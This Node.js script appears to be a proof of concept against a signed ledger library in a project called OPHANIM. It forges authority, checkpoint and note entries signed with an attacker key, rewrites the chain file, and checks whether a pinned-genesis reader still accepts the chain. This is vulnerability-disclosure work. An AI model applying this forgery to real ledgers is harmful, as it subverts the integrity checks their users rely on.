// node frontier-forgery-short.mjs /abs/path/to/OPHANIM
import fs from 'node:fs'; import os from 'node:os'; import path from 'node:path';
import {sign, createPrivateKey} from 'node:crypto';
const repo = process.argv[2];
const {createLedger, openLedger, defineKinds, generateSigner, LEDGER_SCHEMA} = await import(path.join(repo, 'ophanim/ledger/chain.mjs'));
const {canonical, digest} = await import(path.join(repo, 'ophanim/board.mjs'));
const H = v => 'sha256:' + digest(v);
const bodyOf = e => ({schema: e.schema, kind: e.kind, author: e.author, derived_from: e.derived_from, payload_ref: e.payload_ref});
const orderOf = e => ({seq: e.seq, parent: e.parent, body: H(bodyOf(e))});
const sig = (v, pem) => sign(null, Buffer.from(canonical(v)), createPrivateKey(pem)).toString('base64');
const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ledger-poc-'));
const kinds = defineKinds({note: {authors: a => a.key_id === 'seat', validate: () => null, rederive: () => null}});
// Honest setup: three keys the attacker never sees.
const operator = generateSigner('operator'), orderer = generateSigner('orderer'), seat = generateSigner('seat');
const anchor = createLedger({dir, operator, order: orderer, authority: {keyring: {operator: operator.publicJwk, orderer: orderer.publicJwk, seat: seat.publicJwk}, orderer: 'orderer', operators: ['operator']}});
openLedger({dir, kinds, anchor}).append({kind: 'note', payload: {text: 'honest'}, author: {key_id: 'seat'}, signer: seat, order: orderer});
// Attacker: write access to the directory, one key of its own.
const mallory = generateSigner('mallory'), file = path.join(dir, 'chain.jsonl');
const genesis = JSON.parse(fs.readFileSync(file, 'utf8').split('\n')[0]);
const put = v => { fs.writeFileSync(path.join(dir, 'objects', H(v).slice(7) + '.json'), canonical(v)); return H(v); };
const forge = (prev, seq, kind, author, payload) => {
  const e = {schema: LEDGER_SCHEMA, seq, parent: H(prev), kind, author: {key_id: author}, derived_from: [], payload_ref: put(payload)};
  e.author_sig = sig(bodyOf(e), mallory.privatePem); e.order_sig = sig(orderOf(e), mallory.privatePem); return e;
};
const authority = forge(genesis, 2, 'authority', 'operator', {add: {operator: mallory.publicJwk, orderer: mallory.publicJwk, seat: mallory.publicJwk}});
const checkpoint = forge(authority, 3, 'checkpoint', 'orderer', {through: 2, root: H({hashes: [H(genesis), H(authority)]})});
const forged = forge(checkpoint, 4, 'note', 'seat', {text: 'written without any legitimate key'});
fs.writeFileSync(file, [genesis, authority, checkpoint, forged].map(e => JSON.stringify(e) + '\n').join(''));
// A reader who pins the original genesis.
const reader = openLedger({dir, kinds, anchor});
console.log('frontier:', reader.verify({mode: 'frontier'}).ok, '| full:', reader.verify({mode: 'full'}).ok);
console.log('append seq:', reader.append({kind: 'note', payload: {text: 'again'}, author: {key_id: 'seat'}, signer: {...mallory, key_id: 'seat'}, order: {...mallory, key_id: 'orderer'}}).seq);
